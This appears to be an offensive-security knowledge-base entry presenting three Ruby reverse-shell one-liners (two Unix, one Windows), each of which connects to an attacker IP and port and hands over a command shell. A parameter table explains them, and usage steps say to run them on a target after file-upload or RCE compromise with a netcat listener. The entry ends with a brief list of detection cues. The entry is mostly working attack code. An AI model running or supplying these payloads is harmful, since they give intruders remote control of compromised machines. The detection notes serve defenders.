---
type: code
language: ruby
verified: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - reverse-shell
  - payload
  - ruby
validated: true
---

# Ruby-Reverse-Shell-Payloads

## Code

```ruby
ruby -rsocket -e'f=TCPSocket.open("$ATTACKER_IP",$ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("$ATTACKER_IP","$ATTACKER_PORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("$ATTACKER_IP","$ATTACKER_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Description

This code collection provides Ruby-based payloads for establishing reverse shells. The first is an interactive Unix shell via I/O redirection. The second is a Unix command executor with cd and exit support. The third is a Windows command executor using a persistent loop. These payloads use Ruby's TCPSocket for outbound connections, making them suitable for bypassing inbound firewall rules.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | Attacker's listening IP address | 192.168.1.100 |
| $ATTACKER_PORT | Attacker's listening port | 4444 |

## Usage

Substitute parameters and execute on the target via command line, script injection, or file execution. Pair with a listener like netcat (`nc -lvnp $ATTACKER_PORT`). Used in post-exploitation for gaining shell access after initial compromise, such as via file upload or RCE vulnerabilities.

## Detection

- Monitor for ruby process spawning with -rsocket or -e flags via Sysmon or EDR tools.
- Network logs showing outbound TCP from ruby.exe to unusual IPs/ports.
- Behavioral analytics for unexpected command executions or socket creations in Ruby scripts.
- File integrity monitoring for unauthorized Ruby scripts.

## Related

- [[procedures/Establish-Ruby-Reverse-Shell]]
- [[tools/Netcat]]
